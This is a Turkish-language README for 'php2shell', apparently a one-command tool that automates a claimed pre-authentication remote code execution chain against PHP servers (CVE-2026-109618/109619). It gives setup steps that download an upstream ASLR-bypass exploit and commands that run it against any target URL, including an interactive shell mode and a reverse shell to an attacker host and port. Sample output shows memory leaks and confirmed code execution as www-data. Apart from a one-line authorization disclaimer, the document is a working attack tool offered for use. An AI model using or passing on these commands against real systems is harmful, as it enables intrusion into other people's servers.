# php2shell

Kimlik doğrulaması gerektirmeyen PHP RCE için tek komutluk araç:
**CVE-2026-109618 / CVE-2026-109619** (PHP2Shell).

Sürümü kendisi tespit eder, doğru build profilini seçer, Docker lab'ı kurar ve
zinciri çalıştırır. `devploit/php2shell` araç seti (MIT) programın içine gömülü
olarak gelir.

> Yalnızca sahibi olduğunuz veya yazılı izin verdiğiniz sistemlerde kullanın.

---

## Kurulum

```bash
git clone https://github.com/kaaangumus/php2shell-kit ~/php2shell
cd ~/php2shell

python3 php2shell --setup          # upstream exploiti indirir (tek seferlik)
sudo ln -sf ~/php2shell/php2shell /usr/local/bin/php2shell

php2shell --doctor
```

`--setup` sadece `9bie/php2shell-bypass-aslr-exp` deposunu klonlar (lisansı
olmadığı için koda gömülmedi, çalışma anında indirilir).

## Kullanım

```bash
php2shell -u https://hedef              # otomatik tespit + exploit
php2shell -u https://hedef --check      # sadece sürüm kontrolü (hiçbir şey göndermez)
php2shell -u https://hedef --assess     # davranış değerlendirmesi (sömürü yok)
php2shell -u https://hedef --shell      # interaktif komut döngüsü
php2shell -u https://hedef --rev --lhost 1.2.3.4 --lport 4444
php2shell -u https://hedef -c 'id'      # tek komut
php2shell --doctor                      # ortam tanılama
php2shell --setup                       # upstream indir
```

### Ne yapıyor

| Adım | Davranış |
|---|---|
| Sürüm tespiti | `X-Powered-By` / `Server` başlığından PHP sürümünü okur |
| Profil seçimi | Sürüm + mimariye göre doğrulanmış profili seçer |
| Offset çıkarımı | Hedef container'dan `zif_system` / `zval_ptr_dtor` sembollerini okur |
| Docker | Yoksa kurar, daemon kapalıysa başlatır |
| Temizlik | Önceki denemeden kalan `lab/rce/out` ve `offsets.env` siler |
| Tekrar | Başarısızsa lab'ı tazeleyip 3 kez dener |

## Çıktı

```
$ php2shell -u http://127.0.0.1:8105/index.php

[*] tespit: PHP 8.4.26 / amd64 -> profil php-8.4.26-bookworm-amd64
00:00.11  OK         PHP 8.4.26  ·  Apache/2.4.69 (Debian)
00:00.11  INFO       offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
   │ [*] stage 1: heap leak (attempt 1/3)
   │ [+] chunk base = 0x7130a3c00000
   │ [*] stage 2: libphp leak
   │ [+] libphp base = 0x7130a587b000
   │ [*] stage 3: HTDATA=... ZIF=...
   │ [+] W3 attempt 1
   │ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)

╭─ RESULT ─────────────────────────────╮
│ PRE-AUTH RCE CONFIRMED               │
╰──────────────────────────────────────╯
```

## Doğrulanmış build'ler

Profil tablosunda `rce: true` olanlar gerçekten doğrulanmış:

| PHP | Platform | Durum |
|---|---|---|
| 8.4.26 | bookworm amd64 | RCE doğrulandı |
| 8.5.11 | bookworm amd64 / aarch64 | RCE doğrulandı |
| 8.5.10 | bookworm aarch64 | RCE doğrulandı |
| 8.4.25 | bookworm aarch64 | RCE (olasılıksal, tekrar dener) |

Profil yoksa araç tahmin etmez, durur:

```
[!] 8.3.33 (amd64) icin dogrulanmis RCE profili yok.
    - mod_php/109618: --profile ... veya --php-version
    - FPM/109619    : --assess (somuru yapmaz)
```

## CVE kapsamı

| Yetenek | CVE-2026-109618 | CVE-2026-109619 |
|---|---|---|
| Sürüm kontrolü (`--check`) | evet | evet |
| Davranış değerlendirmesi (`--assess`) | evet | evet (FPM stale-state) |
| RCE zinciri (`-u`, `--shell`, `--rev`) | evet, mod_php | **hayır** |

Doğrulanmış zincir mod_php tarafıdır. FPM/109619 için elimizde çalışan bir
profil yok; `--assess` yalnızca sinyal toplar ve "RCE doğrulandı" demez.
Sahte bir zincir yazmak yerine sınırı söylüyorum.

## Gereksinimler

- Python 3.10+
- Docker (yalnızca `-u` / `--shell` / `--rev`)
- `nc` (yalnızca `--rev`)
- Linux / WSL (Kali önerilir)

## Sınırlar

- Zincir build'e özel. Yanlış imaj etiketinde stage 1/3 tutmaz —
  **"PoC çalışmadı" ≠ "açık yok"**.
- `--check` başlığa bağlı; `X-Powered-By` gizliyse sonuç yok.
- Dağıtımlar yamayı upstream sürümü değiştirmeden verir
  (Ubuntu `8.3.6-0ubuntu0.24.04.13` yamalıdır ama `8.3.6` der).

## Teşekkür

- [devploit/php2shell](https://github.com/devploit/php2shell) — araç seti, MIT, koda gömülü
- [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) — RCE zinciri, `--setup` ile indirilir
- Calif / Wiz / OpenAI araştırması

## Lisans

Depodaki sarmalayıcı: MIT (`LICENSE`).
Gömülü araç seti: MIT, `devploit` telif hakkı (`vendor/LICENSE`).
`--setup` ile indirilen upstream exploit kendi deposunun koşullarına tabidir.
